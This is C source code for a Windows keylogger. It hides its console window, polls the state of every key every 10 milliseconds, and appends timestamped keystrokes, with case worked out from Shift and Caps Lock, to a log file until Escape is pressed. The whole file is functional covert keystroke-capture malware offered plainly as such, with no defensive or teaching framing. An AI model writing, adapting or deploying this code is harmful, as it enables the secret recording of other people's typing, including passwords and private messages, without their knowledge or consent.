// KeyLogger for Windows machine

#include <ctype.h>
#include <windows.h>
#include "win_keylog.h"
#include "../writing/file.h"

// Whenever the keylogger is started, add this to the file first
void winWriteHeader(const char* filePath) {
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }

    // Write the date and time into the file
    SYSTEMTIME st;
    GetLocalTime(&st);
    char date[100];
    sprintf(date, "[%02d/%02d/%04d %02d:%02d:%02d] : ", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);
    fputs(date, file);
    fflush(file);
    fclose(file);
}

// Keylogger for Windows
void windows_keylog(const char* filePath) {
    // Write the header into the file
    winWriteHeader(filePath);

    // Hide the console
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Infinite loop
    while(1) {
        // Sleep for 10ms
        Sleep(10);

        // Loop through all the ASCII characters
        for (int key = 0; key <= 255; key++) {
            // Check if the key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                // Check if the key is a special key
                int isSpecialKey = CheckSpecialKey(key);
                if (isSpecialKey) {
                    // Convert special key into readable key
                    char *specialKey = SpecialKeyToReadable(key);
                    if (specialKey != NULL) {
                        WriteSpecialKeyIntoFile(specialKey, filePath);
                    }
                } else {
                    // Check if the key is a letter
                    if (isalpha(key)) {
                        // Check if the key is uppercase
                        if (GetKeyState(VK_CAPITAL) & 0x0001 || GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000) {
                            key = toupper(key);
                            WriteIntoFile(toupper(key), filePath);
                        } else {
                            WriteIntoFile(tolower(key), filePath);
                        }
                    }
                }
            }
        }

        // Check if the keylogger should end
        end_keylog(filePath);
    }
}

// End the keylogger
void end_keylog(const char* filePath) {
    // If the escape key is pressed, end the keylogger
    if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
        // Add a new line to the file
        FILE *file;
        file = fopen(filePath, "a");
        if (file == NULL) {
            return;
        }
        fputs("\n", file);
        fflush(file);
        fclose(file);

        // Show the console
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_SHOW);
        exit(0);
    }
}